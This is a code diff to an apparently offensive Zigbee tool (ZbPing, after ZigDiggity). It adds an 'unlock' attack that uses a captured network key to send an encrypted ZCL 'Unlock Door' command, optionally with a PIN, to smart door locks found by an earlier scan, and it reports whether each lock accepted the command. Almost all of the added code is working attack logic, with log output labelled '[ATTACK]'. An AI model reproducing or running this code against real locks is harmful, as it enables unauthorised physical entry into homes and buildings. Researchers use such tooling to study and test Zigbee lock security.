@@ -31,11 +31,13 @@ ZbPing::ZbPing(IEEE802154Sniffer &sniffer, ZbJoiner &joiner)
     , _lockEpCount(0), _lockEpIndex(0), _lockSentAt_ms(0)
     , _lockFound(false), _lockSweeping(false)
     , _sweepLen(0), _sweepIdx(0), _sweepPan(0xFFFF)
+    , _unlockTarget(0xFFFF), _unlockSentAt_ms(0)
 {
     memset(_pending, 0, sizeof(_pending));
     memset(_cache, 0, sizeof(_cache));
     memset(_lockEndpoints, 0, sizeof(_lockEndpoints));
     memset(_sweepQueue, 0, sizeof(_sweepQueue));
+    memset(_locks, 0, sizeof(_locks));
 
     // Seed all counters from HWRNG so a reboot doesn't restart the NWK frame
     // counter at a value a receiver may have already seen from our EUI64
@@ -49,33 +51,46 @@ ZbPing::ZbPing(IEEE802154Sniffer &sniffer, ZbJoiner &joiner)
 
 // -- Public -------------------------------------------------------------------
 
-// Build an APS+ZDO request, NWK-encrypt and transmit it. `extra` is the ZDO
-// payload following the transaction-sequence byte. Returns the ZDP transaction
-// sequence used, or -1 on failure. Shared by ping() and find_lock.
-int ZbPing::_sendZdoReq(uint16_t cluster, uint16_t target, uint16_t pan,
-                         const uint8_t *extra, uint8_t extraLen) {
-    uint8_t seq = _zdoSeq++;
-    uint8_t aps[16];
-    if (9 + extraLen > (int)sizeof(aps)) return -1;
+// Build an APS Data frame to (dstEp, cluster, profile) with `payload` as the
+// APS payload, NWK-encrypt and transmit. Shared by every ZDO/ZCL sender here.
+bool ZbPing::_sendApsData(uint8_t dstEp, uint8_t srcEp, uint16_t cluster,
+                          uint16_t profile, const uint8_t *payload, uint8_t payloadLen,
+                          uint16_t target, uint16_t pan) {
+    uint8_t aps[32];   // 8-byte APS header + payload; _nwkEncryptAndSend caps at 32
+    if (8 + (int)payloadLen > (int)sizeof(aps)) return false;
     aps[0] = 0x00;  // APS FC: type=Data, delivery=unicast, unsecured
-    aps[1] = ZB_ZDO_EP;
+    aps[1] = dstEp;
     aps[2] = (uint8_t)(cluster & 0xFF);
     aps[3] = (uint8_t)(cluster >> 8);
-    aps[4] = (uint8_t)(ZB_ZDO_PROFILE_ID & 0xFF);
-    aps[5] = (uint8_t)(ZB_ZDO_PROFILE_ID >> 8);
-    aps[6] = ZB_ZDO_EP;
+    aps[4] = (uint8_t)(profile & 0xFF);
+    aps[5] = (uint8_t)(profile >> 8);
+    aps[6] = srcEp;
     aps[7] = _apsCounter++;
-    aps[8] = seq;                       // ZDP transaction seq
-    for (uint8_t i = 0; i < extraLen; i++) aps[9 + i] = extra[i];
-    uint8_t apsLen = 9 + extraLen;
+    for (uint8_t i = 0; i < payloadLen; i++) aps[8 + i] = payload[i];
+    uint8_t apsLen = 8 + payloadLen;
 
     if (Verbose) {
-        Serial.printf("[ZDO] cluster=0x%04X -> 0x%04X plaintext: ", cluster, target);
+        Serial.printf("[APS] ep=%u cluster=0x%04X prof=0x%04X -> 0x%04X: ",
+                      dstEp, cluster, profile, target);
         for (uint8_t i = 0; i < apsLen; i++) Serial.printf("%02X ", aps[i]);
         Serial.println();
     }
+    return _nwkEncryptAndSend(pan, target, aps, apsLen);
+}
 
-    if (!_nwkEncryptAndSend(pan, target, aps, apsLen)) return -1;
+// Build an APS+ZDO request. `extra` is the ZDO payload following the
+// transaction-sequence byte. Returns the ZDP transaction sequence used, or -1
+// on failure. Shared by ping() and find_lock.
+int ZbPing::_sendZdoReq(uint16_t cluster, uint16_t target, uint16_t pan,
+                         const uint8_t *extra, uint8_t extraLen) {
+    uint8_t seq = _zdoSeq++;
+    uint8_t body[16];
+    if (1 + (int)extraLen > (int)sizeof(body)) return -1;
+    body[0] = seq;                      // ZDP transaction seq
+    for (uint8_t i = 0; i < extraLen; i++) body[1 + i] = extra[i];
+    if (!_sendApsData(ZB_ZDO_EP, ZB_ZDO_EP, cluster, ZB_ZDO_PROFILE_ID,
+                      body, 1 + extraLen, target, pan))
+        return -1;
     return seq;
 }
 
@@ -187,6 +202,101 @@ void ZbPing::_nextSweepOrIdle() {
     _startLockScan(next, _sweepPan);
 }
 
+// -- unlock (ZigDiggity "unlock") ---------------------------------------------
+
+LockInfo *ZbPing::_findLockInfo(uint16_t addr) {
+    for (int i = 0; i < MAX_LOCK_INFO; i++)
+        if (_locks[i].valid && _locks[i].addr == addr) return &_locks[i];
+    return nullptr;
+}
+
+void ZbPing::_recordLockInfo(uint16_t addr, uint16_t pan, uint8_t ep, uint16_t profile) {
+    LockInfo *li = _findLockInfo(addr);
+    if (!li) {
+        for (int i = 0; i < MAX_LOCK_INFO; i++)
+            if (!_locks[i].valid) { li = &_locks[i]; break; }
+        if (!li) li = &_locks[0];  // table full — recycle
+    }
+    li->valid    = true;
+    li->addr     = addr;
+    li->pan      = pan;
+    li->endpoint = ep;
+    li->profile  = (profile == 0x0000) ? ZB_PROFILE_HA : profile;
+}
+
+bool ZbPing::unlock(uint16_t targetShortAddr, const char *pin) {
+    if (!_joiner.isAssociated() || !_sniffer.findLatestNetworkKey()) {
+        Serial.println("[Unlock] Need a join ('J') and a captured network key first");
+        return false;
+    }
+    LockInfo *li = _findLockInfo(targetShortAddr);
+    if (!li) {
+        Serial.printf("[Unlock] 0x%04X not known to be a lock - run 'L%04X' (find_lock) first\n",
+                      targetShortAddr, targetShortAddr);
+        return false;
+    }
+
+    // ZCL frame: FC(1) seq(1) cmd(1) [PIN octet-string], cluster-specific,
+    // client->server. FC 0x01 leaves the Default Response enabled so we learn
+    // whether the lock accepted the command.
+    uint8_t zcl[16];
+    uint8_t n = 0;
+    zcl[n++] = 0x01;                        // ZCL FC: cluster-specific, c->s
+    zcl[n++] = _zdoSeq++;                   // ZCL transaction seq (reuse counter)
+    zcl[n++] = ZCL_DOORLOCK_CMD_UNLOCK;     // 0x01 = Unlock Door
+    if (pin && *pin) {
+        uint8_t pinLen = (uint8_t)strlen(pin);
+        if (pinLen > 8) pinLen = 8;         // door-lock PINs are short; bound the frame
+        zcl[n++] = pinLen;                  // octet string length
+        for (uint8_t i = 0; i < pinLen; i++) zcl[n++] = (uint8_t)pin[i];
+    }
+
+    Serial.println("[ATTACK] ===== unlock =====");
+    Serial.printf("[ATTACK] Sending ZCL Unlock Door to 0x%04X ep %u (profile 0x%04X)%s\n",
+                  li->addr, li->endpoint, li->profile, (pin && *pin) ? " with PIN" : "");
+
+    bool ok = _sendApsData(li->endpoint, 0x01, ZB_CLUSTER_DOOR_LOCK, li->profile,
+                           zcl, n, li->addr, li->pan);
+    if (!ok) {
+        Serial.println("[ATTACK] unlock: TX failed");
+        return false;
+    }
+    _unlockTarget    = li->addr;
+    _unlockSentAt_ms = millis();
+    Serial.println("[ATTACK] Unlock sent - watching for a Door Lock/Default Response...");
+    return true;
+}
+
+void ZbPing::_handleDoorLockRsp(uint16_t src, const uint8_t *zcl, uint8_t zclLen) {
+    // ZCL header: FC(1) [mfgCode(2) if FC bit2] seq(1) cmd(1) then payload.
+    if (zclLen < 3) return;
+    uint8_t fc = zcl[0];
+    uint8_t off = 1;
+    if (fc & 0x04) off += 2;               // manufacturer-specific code present
+    if (off + 1 >= zclLen) return;
+    off += 1;                              // skip transaction seq
+    uint8_t cmd = zcl[off++];
+
+    uint8_t status = 0xFF;
+    if (cmd == ZCL_CMD_DEFAULT_RESPONSE && off + 1 < zclLen) {
+        // Default Response: respondedCmd(1) status(1)
+        status = zcl[off + 1];
+    } else if (cmd == ZCL_DOORLOCK_CMD_UNLOCK && off < zclLen) {
+        // Unlock Door Response: status(1)  (0x00 = SUCCESS)
+        status = zcl[off];
+    } else {
+        Serial.printf("[Unlock] 0x%04X sent Door Lock response cmd 0x%02X\n", src, cmd);
+        _unlockTarget = 0xFFFF;
+        return;
+    }
+
+    if (status == 0x00)
+        Serial.printf("[Unlock] *** 0x%04X ACCEPTED unlock (status SUCCESS) ***\n", src);
+    else
+        Serial.printf("[Unlock] 0x%04X rejected unlock (status 0x%02X)\n", src, status);
+    _unlockTarget = 0xFFFF;
+}
+
 void ZbPing::update() {
     uint32_t now = millis();
     for (int i = 0; i < MAX_PENDING_PINGS; i++) {
@@ -218,6 +328,13 @@ void ZbPing::update() {
                 _finishLockTarget();
         }
     }
+
+    // unlock response timeout
+    if (_unlockTarget != 0xFFFF && (now - _unlockSentAt_ms) > UNLOCK_TIMEOUT_MS) {
+        Serial.printf("[Unlock] 0x%04X: no response (command may still have taken effect)\n",
+                      _unlockTarget);
+        _unlockTarget = 0xFFFF;
+    }
 }
 
 bool ZbPing::processFrame(const FrameInfo &info, const uint8_t *rawFrame,
@@ -229,11 +346,12 @@ bool ZbPing::processFrame(const FrameInfo &info, const uint8_t *rawFrame,
     if (is_bcast(info.route.nwkDst))                  return false;
 
     // Only spend effort decrypting if we're actually waiting on this source —
-    // either for a ping response or as part of an in-flight find_lock scan.
+    // a ping response, an in-flight find_lock scan, or an unlock response.
     uint16_t src = info.route.nwkSrc;
     PendingPing *p = _findPending(src);
-    bool wantLock = (_lockPhase != LockScanPhase::IDLE && src == _lockTarget);
-    if (!p && !wantLock) return false;
+    bool wantLock   = (_lockPhase != LockScanPhase::IDLE && src == _lockTarget);
+    bool wantUnlock = (_unlockTarget != 0xFFFF && src == _unlockTarget);
+    if (!p && !wantLock && !wantUnlock) return false;
 
     if (macPayloadOffset >= rawLen) return false;
     const uint8_t *nwk = rawFrame + macPayloadOffset;
@@ -257,10 +375,18 @@ bool ZbPing::processFrame(const FrameInfo &info, const uint8_t *rawFrame,
 
     uint16_t cluster = (uint16_t)plain[2] | ((uint16_t)plain[3] << 8);
     uint16_t profile = (uint16_t)plain[4] | ((uint16_t)plain[5] << 8);
-    if (profile != ZB_ZDO_PROFILE_ID) return false;
 
     const uint8_t *zdo = plain + 8;
     uint8_t zdoLen = plainLen - 8;
+
+    // ZCL (application) response to our unlock — arrives on the app profile,
+    // not the ZDO profile, so handle it before the ZDO cluster switch.
+    if (wantUnlock && cluster == ZB_CLUSTER_DOOR_LOCK && profile != ZB_ZDO_PROFILE_ID) {
+        _handleDoorLockRsp(src, zdo, zdoLen);
+        return true;
+    }
+
+    if (profile != ZB_ZDO_PROFILE_ID) return false;
 
     switch (cluster) {
         case ZB_ZDO_NODE_DESC_RSP: {
@@ -346,6 +472,7 @@ void ZbPing::_handleSimpleDescRsp(uint16_t src, const uint8_t *zdo, uint8_t zdoL
             }
             if (epHasLock) {
                 _lockFound = true;
+                _recordLockInfo(src, _lockPan, ep, profId);
                 Serial.printf("[Lock] 0x%04X ep %u (profile 0x%04X) exposes Door Lock cluster\n",
                               src, ep, profId);
             } else if (Verbose) {
